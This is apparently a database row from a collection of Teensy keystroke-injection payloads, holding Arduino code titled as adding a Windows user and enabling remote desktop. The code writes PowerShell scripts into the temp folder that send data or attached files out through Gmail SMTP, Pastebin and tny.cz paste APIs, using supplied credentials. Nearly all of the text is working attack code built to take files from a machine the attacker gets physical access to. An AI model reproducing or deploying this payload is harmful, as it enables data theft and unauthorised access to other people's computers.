\"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid gmail(String filename, String filepath)\u000d{\u000d    post(filename);\u000d    Keyboard.print("echo $srv = \"smtp.gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.From = \"$user@gmail.com\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.To.Add(\"$user@gmail.com\") >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    if (filepath != "no"){\u000d    \u000d        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");\u000d        Keyboard.print (filepath);\u000d        Keyboard.print ("\") >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");\u000d        Keyboard.print(filename);\u000d        Keyboard.println(".ps1");\u000d    }\u000d    Keyboard.print("echo $st.Send($msg) >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d}\u000d\u000dvoid tinypaste(String filename)\u000d{\u000d    post(filename);\u000d    //http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell\u000d    Keyboard.print("echo $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $utf8 = new-object -TypeName System.Text.UTF8Encoding >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($pass))).Replace(\"-\", \"\").ToLower() >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d    Keyboard.print("echo pht \"http://tny.cz/api/create.xml\" \"paste=$pv&title=$pn&is_code=0&is_private=1&authenticate=$user`:$hash\" >> %temp%\\");\u000d    Keyboard.print(filename);\u000d    Keyboard.println(".ps1");\u000d\u000d}\u000d','2013-07-18 00:00:00.000000','Keyboard add a user and enable DRP (windows)','TEENSY')
COMMIT
